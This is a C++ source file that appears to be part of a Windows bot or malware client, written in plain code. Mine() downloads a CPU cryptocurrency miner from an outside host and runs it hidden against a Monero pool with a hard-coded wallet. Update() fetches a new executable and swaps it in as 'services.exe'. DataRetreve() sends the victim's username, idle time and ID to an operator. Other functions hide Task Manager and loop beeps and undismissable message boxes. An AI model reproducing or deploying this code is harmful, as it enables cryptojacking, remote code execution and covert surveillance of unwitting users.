#include "Includes.h"
#include <Lmcons.h>

typedef BOOL(WINAPI *LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);
LPFN_ISWOW64PROCESS fnIsWow64Process;
HWND Openwindow;

BOOL IsWow64()
{
	BOOL bIsWow64 = FALSE;

	//IsWow64Process is not available on all supported versions of Windows.
	//Use GetModuleHandle to get a handle to the DLL that contains the function
	//and GetProcAddress to get a pointer to the function if available.

	fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(
		GetModuleHandle(TEXT("kernel32")), "IsWow64Process");

	if (NULL != fnIsWow64Process)
	{
		if (!fnIsWow64Process(GetCurrentProcess(), &bIsWow64))
		{
			//handle error
		}
	}
	return bIsWow64;
}

//void GSax() {
//	
//	HWND SOpenwindow;
//	HWND Openwindow = NULL;
//	char wnd_title[256];
//	int time = 0;
//	int timer = 109;
//	//std::cout << "Sax Time";
//	URLDownloadToFile(NULL, "http://pyrin.org/HD%20Epic%20Sax%20Gandalf%20%281%29.mp4", "GandalfSax.mp4", 0, NULL);
//	ShellExecute(NULL, "open", "GandalfSax.mp4", NULL, NULL, SW_MAXIMIZE);
//	Sleep(500);
//	GetWindowText(Openwindow, wnd_title, sizeof(wnd_title));
//	std::cout << wnd_title;
//	PostMessage(Openwindow, WM_KEYDOWN, VK_F11, NULL);
//	while (1) {
//		if (GetAsyncKeyState(VK_F11)) {
//			PostMessage(Openwindow, WM_KEYDOWN, VK_F11, NULL);
//			Sleep(250);
//		}
//	}
//	
//	/*while (1) {
//		if (time >= timer) {
//			SendMessage(GetForegroundWindow(), WM_CLOSE, 0, 0);
//			ShellExecute(NULL, "open", "GandalfSax.mp4", NULL, NULL, SW_MAXIMIZE);
//			Openwindow = GetForegroundWindow();
//			SetForegroundWindow(Openwindow);
//			time = 0;
//		}else{
//			if (Openwindow == GetForegroundWindow() || Openwindow == GetActiveWindow()) {
//				if (FindWindow(NULL,wnd_title) == NULL) {
//					ShellExecute(NULL, "open", "GandalfSax.mp4", NULL, NULL, SW_MAXIMIZE);
//					Sleep(200);
//					time = 0;
//				}
//				time++;
//				Sleep(1000);
//			}
//			else {
//				if (GetForegroundWindow() == NULL) {
//					ShellExecute(NULL, "open", "GandalfSax.mp4", NULL, NULL, SW_MAXIMIZE);
//					Sleep(500);
//					Openwindow = FindWindow(NULL, wnd_title);
//					SetForegroundWindow(Openwindow);
//					Sleep(200);
//				}
//				else {
//					SendMessage(GetForegroundWindow(), WM_CLOSE, 0, 0);
//					ShellExecute(NULL, "open", "GandalfSax.mp4", NULL, NULL, SW_MAXIMIZE);
//					Sleep(500);
//					Openwindow = FindWindow(NULL, wnd_title);
//					SetForegroundWindow(Openwindow);
//					Sleep(200);
//
//				}
//			}
//		}
//	}*/
//}

void KillTaskMan() {
	HWND tm;
	ShellExecute(NULL, "open", "C:\\Windows\\System32\\taskmgr.exe", NULL, NULL, SW_HIDE);
	tm = FindWindow(NULL, "Windows Task Manager");
	ShowWindow(tm, SW_HIDE);
	Sleep(100);
}

void Mine() {
	std::string ret;
	if (IsWow64()) {
		ret = URLDownloadToFile(NULL, "http://www.pyrin.org//NsCpuCNMiner64.exe", "minerd.exe", 0, NULL);
		sendmessage("64bit Miner downloaded");
		std::ofstream mine("mine.bat");
		mine << "minerd -o stratum+tcp://pool.minexmr.com:4444 -u 4BFk98n3neZbdEYgZtpaQdarL7tnKcAWy8spvSTCsoBo6Bd8eJrLBoF5w12eizueXQ2jRDNFoYJxCgReGCyYvCcEJnxdcNn  -p x pause";
		mine.close();
		ShellExecute(NULL, "open", "mine.bat", NULL, NULL, SW_HIDE);
	}else{
		ret = URLDownloadToFile(NULL, "http://www.pyrin.org//NsCpuCNMiner32.exe", "minerd.exe", 0, NULL);
		sendmessage("32bit Miner downloaded");
		std::ofstream mine("mine.bat");
		mine << "minerd -o stratum+tcp://pool.minexmr.com:4444 -u 4BFk98n3neZbdEYgZtpaQdarL7tnKcAWy8spvSTCsoBo6Bd8eJrLBoF5w12eizueXQ2jRDNFoYJxCgReGCyYvCcEJnxdcNn  -p x pause";
		mine.close();
		ShellExecute(NULL, "open", "mine.bat", NULL, NULL, SW_HIDE);
	}
}

void Sstart() {
start:
	Beep(300, 500);
	Sleep(50);
	Beep(300, 500);
	Sleep(50);
	Beep(300, 500);
	Sleep(50);

	Beep(250, 500);
	Sleep(50);

	Beep(350, 250);
	Beep(300, 500);
	Sleep(50);

	Beep(250, 500);
	Sleep(50);

	Beep(350, 250);
	Beep(300, 500);
	Sleep(50);
	goto start;
}

void MessageBox1() {
start:
	if (MessageBox(NULL, "Bet you can't close this", "Windows", MB_OKCANCEL) == IDCANCEL) {
		goto start;
	}
	else {
		goto start;
	}
}

void DataRetreve() {
	std::cout << "DR";
	LASTINPUTINFO last_input;
	DWORD te = ::GetTickCount();
	last_input.cbSize = sizeof(LASTINPUTINFO);
	std::ostringstream send;
	//TODO
	//Get gpu
	std::ifstream idi("services.dll", std::ios::binary);
	std::string id;
	if (idi.is_open()) {
		while (!idi.eof()) {
			getline(idi, id);
		}
	}
	if (IsWow64()) {
		char user_name[UNLEN + 1];
		DWORD user_name_size = sizeof(user_name);
		if (GetUserName(user_name, &user_name_size)){
			if (GetLastInputInfo(&last_input)){
				send << "64bit : " << user_name << " | Last Active: " << (te - last_input.dwTime) / 100 << "| ID:" << id;
			}else {// failed to get last input from user
				send << "64bit : " << user_name << " | Last Active: " << "failed" << "| ID:" << id;
			}
		}else { // failed to get username
			if (GetLastInputInfo(&last_input)) {
				send << "64bit : " << "Failed " << " | Last Active: " << (te - last_input.dwTime) / 100 << "| ID:" << id;
			}
			else {// failed to get last input from user
				send << "64bit : " << "Failed" << " | Last Active: " << "failed" << "| ID:" << id;
			}
		}
		std::string s = send.str();
		sendmessage(s);
		std::cout << send.str();
	}else {
		char user_name[UNLEN + 1];
		DWORD user_name_size = sizeof(user_name);
		if (GetUserName(user_name, &user_name_size)) {
			if (GetLastInputInfo(&last_input)) {
				send << "32bit : " << user_name << " | Last Active: " << (te - last_input.dwTime) / 100 << " | ID:" << id;
			}
			else {// failed to get last input from user
				send << "32bit : " << user_name << " | Last Active: " << "failed" << "| ID:" << id ;
			}
		}
		else { // failed to get username
			if (GetLastInputInfo(&last_input)) {
				send << "32bit : " << "Failed" << " | Last Active: " << (te - last_input.dwTime) / 100 << "| ID:" << id;
			}
			else {// failed to get last input from user
				send << "32bit : " << "Failed" << " | Last Active: " << "failed" << "| ID:" << id;
			}
		}
		std::string s = send.str();
		sendmessage(s);
		std::cout << send.str();
	}
	
}

void Update(std::string web) {
	HWND hwnd;
	hwnd = FindWindow("ConsoleWindowClass", NULL);
	URLDownloadToFile(NULL, web.c_str(), "ServiceUpdate.exe", 0, NULL);
	std::ofstream mine("ServiceUpdater.bat");
	mine << "timeout /t 2 \n del \"services.exe\" \n ren \"ServiceUpdate.exe\" \"services.exe\" \n start services ";
	mine.close();
	ShellExecute(NULL, "open", "ServiceUpdater.bat", NULL, NULL, SW_HIDE);
	SendMessage(hwnd, WM_CLOSE, 0, 0);
}